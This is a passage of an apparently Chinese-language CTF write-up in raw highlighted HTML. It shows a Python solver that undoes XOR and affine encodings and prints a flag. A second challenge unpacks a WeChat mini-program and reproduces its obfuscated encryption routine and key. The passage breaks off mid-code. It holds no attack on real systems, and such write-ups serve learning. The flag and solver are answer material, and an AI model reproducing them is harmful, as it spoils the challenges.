+</span></span></span><span class=line><span class=cl><span class=s2>173 232
+</span></span></span><span class=line><span class=cl><span class=s2>200 254
+</span></span></span><span class=line><span class=cl><span class=s2>54 69
+</span></span></span><span class=line><span class=cl><span class=s2>248 119
+</span></span></span><span class=line><span class=cl><span class=s2>143 115
+</span></span></span><span class=line><span class=cl><span class=s2>194 91
+</span></span></span><span class=line><span class=cl><span class=s2>153 252
+</span></span></span><span class=line><span class=cl><span class=s2>165 89
+</span></span></span><span class=line><span class=cl><span class=s2>252 101
+</span></span></span><span class=line><span class=cl><span class=s2>1 146
+</span></span></span><span class=line><span class=cl><span class=s2>147 153
+</span></span></span><span class=line><span class=cl><span class=s2>59 60
+</span></span></span><span class=line><span class=cl><span class=s2>7 10
+</span></span></span><span class=line><span class=cl><span class=s2>30 77
+</span></span></span><span class=line><span class=cl><span class=s2>83 13
+</span></span></span><span class=line><span class=cl><span class=s2>19 255
+</span></span></span><span class=line><span class=cl><span class=s2>236 94
+</span></span></span><span class=line><span class=cl><span class=s2>205 49
+</span></span></span><span class=line><span class=cl><span class=s2>252 178
+</span></span></span><span class=line><span class=cl><span class=s2>12 232
+</span></span></span><span class=line><span class=cl><span class=s2>228 78
+</span></span></span><span class=line><span class=cl><span class=s2>221 65
+</span></span></span><span class=line><span class=cl><span class=s2>156 170
+</span></span></span><span class=line><span class=cl><span class=s2>234 2
+</span></span></span><span class=line><span class=cl><span class=s2>232 54
+</span></span></span><span class=line><span class=cl><span class=s2>170 131
+</span></span></span><span class=line><span class=cl><span class=s2>41 222
+</span></span></span><span class=line><span class=cl><span class=s2>219 164
+</span></span></span><span class=line><span class=cl><span class=s2>127 247
+</span></span></span><span class=line><span class=cl><span class=s2>141 39
+</span></span></span><span class=line><span class=cl><span class=s2>170 136
+</span></span></span><span class=line><span class=cl><span class=s2>45 114
+</span></span></span><span class=line><span class=cl><span class=s2>95 34
+</span></span></span><span class=line><span class=cl><span class=s2>188 96
+</span></span></span><span class=line><span class=cl><span class=s2>220 125
+</span></span></span><span class=line><span class=cl><span class=s2>235 189
+</span></span></span><span class=line><span class=cl><span class=s2>86 161
+</span></span></span><span class=line><span class=cl><span class=s2>206 122
+</span></span></span><span class=line><span class=cl><span class=s2>180 247
+</span></span></span><span class=line><span class=cl><span class=s2>53 84
+</span></span></span><span class=line><span class=cl><span class=s2>97 67
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=mi>2</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>xor</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=c1># print(xor, len(xor))</span>
+</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[</span><span class=mi>91</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>229</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>237</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=mi>210</span><span class=p>,</span> <span class=mi>213</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>237</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>206</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>217</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>254</span><span class=p>,</span> <span class=mi>119</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>122</span><span class=p>,</span> <span class=mi>84</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xF7</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0xC3</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0xAB</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0xCB</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0xAF</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>29</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>^=</span> <span class=n>text</span><span class=p>[(</span><span class=n>j</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=mi>30</span><span class=p>]</span> <span class=o>^</span> <span class=n>xor</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>30</span><span class=o>+</span><span class=n>j</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>text</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>65</span><span class=p>,</span> <span class=mi>91</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>15</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>65</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span> <span class=o>+</span> <span class=mi>65</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>97</span><span class=p>,</span> <span class=mi>123</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>15</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>97</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span> <span class=o>+</span> <span class=mi>97</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>49</span><span class=p>,</span> <span class=mi>59</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>3</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>48</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span> <span class=o>+</span> <span class=mi>48</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>text</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>cmp</span> <span class=o>=</span> <span class=p>[</span><span class=mi>238</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>196</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>153</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>170</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>125</span><span class=p>,</span> <span class=mi>161</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>67</span><span class=p>,</span> <span class=mi>34</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># for i in range(30):</span>
+</span></span><span class=line><span class=cl><span class=c1>#     print(chr(cmp[i]^108^text[i]), end=&#34;&#34;)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到flag{r0uNd_Rc4_Aff1neEnc1yp0!}</p><h1 id=mobile>Mobile</h1><h2 id=ezminiapp>EzMiniApp</h2><p>wxapkg.exe解包小程序，发现逻辑在app-service.js</p><p>加密逻辑是一个旋转混淆，逻辑如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=nx>enigmaticTransformation</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>t</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>e</span><span class=p>,</span> <span class=nx>n</span><span class=p>,</span> <span class=nx>r</span> <span class=o>=</span> <span class=p>[],</span> 
+</span></span><span class=line><span class=cl>             <span class=nx>i</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>t</span><span class=p>).</span><span class=nx>map</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span> <span class=k>return</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=p>}),</span>
+</span></span><span class=line><span class=cl>             <span class=nx>s</span> <span class=o>=</span> <span class=nx>i</span><span class=p>.</span><span class=nx>length</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>             <span class=nx>c</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                   <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>e</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>e</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>e</span><span class=o>++</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                       <span class=k>switch</span><span class=p>(</span><span class=nx>e</span> <span class=o>%</span> <span class=mi>4</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>1</span> <span class=o>*</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span> <span class=o>+</span> <span class=mi>0</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>0</span> <span class=o>|</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>0</span> <span class=o>^</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                       <span class=p>}</span>
+</span></span><span class=line><span class=cl>                   <span class=k>return</span> <span class=nx>t</span>
+</span></span><span class=line><span class=cl>               <span class=p>}(</span><span class=nx>i</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>             <span class=nx>o</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>o</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>o</span><span class=o>++</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>u</span> <span class=o>=</span> <span class=k>void</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>o</span> <span class=o>%</span> <span class=mi>3</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>u</span> <span class=o>=</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>)</span> <span class=o>^</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>u</span> <span class=o>=</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>]</span> <span class=o>^</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>e</span> <span class=o>=</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                    <span class=nx>n</span> <span class=o>=</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                    <span class=nx>u</span> <span class=o>=</span> <span class=nx>e</span> <span class=o>^</span> <span class=nx>n</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>h</span> <span class=o>=</span> <span class=k>void</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>c</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=nx>u</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>6</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span> <span class=o>&amp;</span> <span class=mi>7</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span> <span class=o>&amp;</span> <span class=mi>15</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>5</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span> <span class=o>&amp;</span> <span class=mi>31</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>6</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>6</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span> <span class=o>&amp;</span> <span class=mi>63</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>7</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span> <span class=o>&amp;</span> <span class=mi>127</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=nx>c</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=nx>c</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>o</span> <span class=o>%</span> <span class=mi>2</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>r</span><span class=p>[</span><span class=nx>r</span><span class=p>.</span><span class=nx>length</span><span class=p>]</span> <span class=o>=</span> <span class=nx>h</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>r</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>h</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=p>[],</span> <span class=nx>e</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>e</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>e</span><span class=o>++</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>switch</span><span class=p>(</span><span class=nx>e</span> <span class=o>%</span> <span class=mi>2</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=mi>0</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nx>t</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span> <span class=o>=</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>t</span>
+</span></span><span class=line><span class=cl>    <span class=p>}(</span><span class=nx>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后主函数的验证逻辑是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>inputValue</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=s2>&#34;&#34;</span> <span class=o>!==</span> <span class=nx>a</span><span class=p>.</span><span class=nx>trim</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>customEncrypt</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=s2>&#34;newKey2025!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>t</span><span class=p>);</span>
